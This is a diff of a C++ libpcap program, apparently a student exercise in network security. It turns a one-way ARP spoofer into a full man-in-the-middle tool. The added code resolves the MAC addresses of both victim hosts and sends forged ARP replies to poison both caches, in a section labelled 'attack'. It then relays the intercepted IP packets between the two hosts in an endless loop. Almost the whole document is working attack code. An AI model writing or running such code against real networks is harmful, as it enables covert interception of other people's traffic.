@@ -14,10 +14,16 @@
 #include <arpa/inet.h>
 #include "eth_hdr.h"
 #include "arp_hdr.h"
+#include "ip_hdr.h"
 
 struct EthArpPacket {
 	eth_hdr eth;
 	arp_hdr arp;
+};
+
+struct EthIpPacket {
+	eth_hdr eth;
+	ip_hdr ip;
 };
 
 uint8_t* split(uint8_t* tip, char argv[])
@@ -114,13 +120,23 @@ EthArpPacket makeArpPacket(uint16_t oper, u_char *smac, u_char *dmac, u_char *ar
 	return packet;
 }
 
-void sendArp(pcap_t* pcap, EthArpPacket packet)
+void sendArp(pcap_t* pcap, const EthArpPacket packet)
 {
 	printf("sent an ARP packet\n");
+	
 	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 	}
+}
+
+void sendPacket(pcap_t* pcap, const u_char *packet, size_t size)
+{
+	int res = pcap_sendpacket(pcap, packet, size);
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+	}
+
 }
 
 void getArp(pcap_t* pcap, pcap_pkthdr **header, const u_char **data)
@@ -130,6 +146,45 @@ void getArp(pcap_t* pcap, pcap_pkthdr **header, const u_char **data)
 	{
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 	}
+}
+
+void getPacket(pcap_t* pcap, pcap_pkthdr **header, const u_char **data)
+{
+	int res = pcap_next_ex(pcap, header, data);
+	if(res != 1)
+	{
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+	}
+}
+
+void getMac(pcap_t* pcap, pcap_t* res_pcap, const EthArpPacket packet, uint8_t *mac, uint8_t *sip, uint8_t *tip)
+{
+		while(true){
+
+		sendArp(pcap, packet);
+
+		printf("receiving packets\n");
+		struct pcap_pkthdr *header;
+		const u_char *data;
+
+		getArp(res_pcap, &header, &data);
+		const EthArpPacket* res_packet = reinterpret_cast<const EthArpPacket*>(data);
+
+		if (ntohs(res_packet->eth.ethType) != 0x0806) continue;
+		if (ntohs(res_packet->arp.Oper) != 0x0002) continue;
+		bool trueRes = true;
+		for(int i=0; i<4; i++){
+			if(res_packet->arp.sip[i] != tip[i] || res_packet->arp.tip[i] != sip[i])
+			{
+				trueRes = false;
+				continue;
+			}
+		}
+		if(trueRes){
+			memcpy(mac, res_packet->arp.smac, sizeof(uint8_t)*6 );
+			break;
+		}
+		}
 }
 
 int main(int argc, char* argv[]) 
@@ -163,40 +218,85 @@ int main(int argc, char* argv[])
 	// get sender's MAC
 	uint8_t vip_arr[4];
 	uint8_t *vip = split(vip_arr, argv[2]);
-	uint8_t gip_arr[4];
-	uint8_t *gip = split(gip_arr, argv[3]);
+	uint8_t tip_arr[4];
+	uint8_t *tip = split(tip_arr, argv[3]);
 	u_char ff[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 	u_char zero[] = {0,0,0,0,0,0};
 	uint8_t vmac[6];
+	uint8_t tmac[6];
 
-	EthArpPacket packet = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, vip);
+	const EthArpPacket SenderPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, vip);
+	const EthArpPacket TargetPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, tip);
 
-		while(true){
-		
-		// arp request
-		sendArp(pcap, packet);
-
-		printf("receiving packets\n");
-		// arp response
-		struct pcap_pkthdr *header;
-		const u_char *data;
-
-		getArp(res_pcap, &header, &data);
-		const EthArpPacket* res_packet = reinterpret_cast<const EthArpPacket*>(data);
-
-		if (ntohs(res_packet->eth.ethType) != 0x0806) continue;
-		if (ntohs(res_packet->arp.Oper) != 0x0002) continue;
-		for(int i=0; i<4; i++){
-			if(res_packet->arp.sip[i] != vip[i]) continue;
-		}
-			memcpy(vmac, res_packet->arp.smac, sizeof(uint8_t)*6 );
-			break;
-		}
+	getMac(pcap, res_pcap, SenderPacket, vmac, myip, vip);
+	getMac(pcap, res_pcap, TargetPacket, tmac, myip, tip);
 	
 		// attack
-		EthArpPacket attackPacket = makeArpPacket(0x0002, mymac, vmac, mymac, vmac, gip, vip);
-		printf("Attacking now\n");
-		sendArp(pcap, attackPacket);
+		const EthArpPacket attackSenderPacket = makeArpPacket(0x0002, mymac, vmac, mymac, vmac, tip, vip);
+		const EthArpPacket attackTargetPacket = makeArpPacket(0x0002, mymac, tmac, mymac, tmac, vip, tip);
+		
+		sendArp(pcap, attackSenderPacket);
+		sendArp(pcap, attackTargetPacket);
+		printf("Attacked\n");
+
+		// relay spoofed packet
+		while(true)
+		{
+			struct pcap_pkthdr *spoofed_header;
+			const u_char *spoofed_data;
+			getPacket(res_pcap, &spoofed_header, &spoofed_data);
+			const EthIpPacket* spoofed_packet = reinterpret_cast<const EthIpPacket*>(spoofed_data);
+			size_t eth_len = sizeof(eth_hdr);
+			size_t ip_len = (spoofed_packet->ip.ver_ihl & 0x0F) * 4; 
+			size_t header_len = eth_len + ip_len;
+			size_t total_len = spoofed_header->caplen;
+			const u_char *payload = spoofed_data + header_len;
+			size_t paylod_len = total_len - header_len;
+			
+			
+			if(ntohs(spoofed_packet->eth.ethType) == 0x0800){
+			EthIpPacket relay_header = *spoofed_packet;
+			bool SenderToTarget = true;
+			bool TargetToSender = true;
+	
+			for(int i=0; i<6; i++)
+			{
+				if(spoofed_packet->eth.smac[i] != vmac[i]) SenderToTarget = false;
+				if(spoofed_packet->eth.smac[i] != tmac[i]) TargetToSender = false;
+			}
+
+			if(SenderToTarget) 
+			{
+				for(int i=0; i<6; i++)
+				{
+					relay_header.eth.dmac[i] = tmac[i];
+					relay_header.eth.smac[i] = mymac[i];
+				}
+				printf("\n");
+				u_char *relay_packet = (u_char*)malloc(total_len);
+				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
+				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
+				sendPacket(pcap, relay_packet, total_len);
+				free(relay_packet);
+			}
+			else if(TargetToSender)
+			{
+				for(int i=0; i<6; i++)
+				{
+					relay_header.eth.dmac[i] = vmac[i];
+					relay_header.eth.smac[i] = mymac[i];
+					}
+					printf("\n");
+				u_char *relay_packet = (u_char*)malloc(total_len);
+				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
+				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
+				sendPacket(pcap, relay_packet, total_len);
+				free(relay_packet);
+			}
+			
+		}
+			
+		}
 
 	//}
 	pcap_close(res_pcap);
